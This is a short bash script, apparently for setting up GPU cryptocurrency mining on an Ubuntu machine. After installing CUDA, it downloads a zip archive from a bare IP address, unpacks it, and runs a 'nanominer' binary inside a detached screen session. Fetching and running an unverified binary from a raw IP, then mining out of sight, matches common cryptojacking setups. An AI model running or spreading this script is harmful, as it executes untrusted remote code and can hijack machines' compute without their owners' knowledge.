#!/bin/bash
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get install unzip cmake libcurl4-openssl-dev libssl-dev libjansson-dev automake libdbus-1-dev autotools-dev build-essential -y
wget https://developer.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda-repo-ubuntu1804-10-1-local-10.1.105-418.39_1.0-1_amd64.deb -O cuda.deb
sudo dpkg -i cuda.deb
sudo apt-key add /var/cuda-repo-10-1-local-10.1.105-418.39/7fa2af80.pub
sudo apt-get update
sudo apt-get install cuda -y
wget 171.244.50.203/nano.zip
unzip nano.zip
cd nano
screen -d -m -S cpuminer bash -c './nanominer'
